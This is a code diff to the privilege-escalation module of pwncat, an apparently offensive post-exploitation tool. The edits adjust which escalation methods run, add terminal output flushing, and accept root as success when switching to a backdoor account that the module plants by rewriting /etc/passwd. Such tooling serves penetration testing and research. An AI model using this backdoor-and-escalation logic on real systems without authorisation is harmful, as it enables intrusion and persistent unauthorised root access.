@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 from typing import Type, List, Tuple
 import crypt
+from time import sleep
+import socket
 
 from pwncat.privesc.base import Method, PrivescError, Technique, SuMethod, Capability
 from pwncat.privesc.setuid import SetuidMethod
@@ -14,8 +16,8 @@ from pwncat import util
 
 # privesc_methods = [SetuidMethod, SuMethod]
 # privesc_methods = [SuMethod, SudoMethod, SetuidMethod, DirtycowMethod, ScreenMethod]
-privesc_methods = [SuMethod, SudoMethod, ScreenMethod, SetuidMethod]
-# privesc_methods = [ScreenMethod]
+# privesc_methods = [SuMethod, SudoMethod, ScreenMethod, SetuidMethod]
+privesc_methods = [SuMethod, SetuidMethod]
 
 
 class Finder:
@@ -124,6 +126,8 @@ class Finder:
                 raise PrivescError("/etc/passwd update failed!")
 
         self.pty.process(f"su {self.backdoor_user_name}", delim=False)
+        self.pty.flush_output()
+
         self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
         self.pty.run("echo")
 
@@ -281,18 +285,27 @@ class Finder:
             try:
                 # Attempt our basic, known technique
                 exit_script = technique.method.execute(technique)
+                self.pty.flush_output()
 
                 # Reset the terminal to ensure we are stable
                 self.pty.reset()
 
                 # Check that we actually succeeded
-                if self.pty.whoami() == technique.user:
+                current = self.pty.whoami()
+
+                if current == technique.user or (
+                    technique.user == self.backdoor_user_name and current == "root"
+                ):
                     return exit_script
 
                 # Check if we ended up in a sub-shell without escalating
                 if self.pty.getenv("SHLVL") != shlvl:
                     # Get out of this subshell. We don't need it
                     self.pty.process(exit_script, delim=False)
+
+                    # Clean up whatever mess was left over
+                    self.pty.flush_output()
+
                     self.pty.reset()
 
                 # The privesc didn't work, but didn't throw an exception.
@@ -313,7 +326,6 @@ class Finder:
         # Read the current content of /etc/passwd
         reader = gtfobins.Binary.find_capability(self.pty.which, Capability.READ)
         if reader is None:
-            print("\nNo reader found")
             raise PrivescError("no file reader found")
 
         payload = reader.read_file("/etc/passwd")
@@ -352,7 +364,10 @@ class Finder:
         self.backdoor_user = self.pty.users[user]
 
         # Switch to the new user
-        self.pty.process(f"su {user}", delim=False)
+        # self.pty.process(f"su {user}", delim=False)
+        self.pty.process(f"su {user}", delim=True)
+        self.pty.flush_output()
+
         self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
         self.pty.run("echo")
 
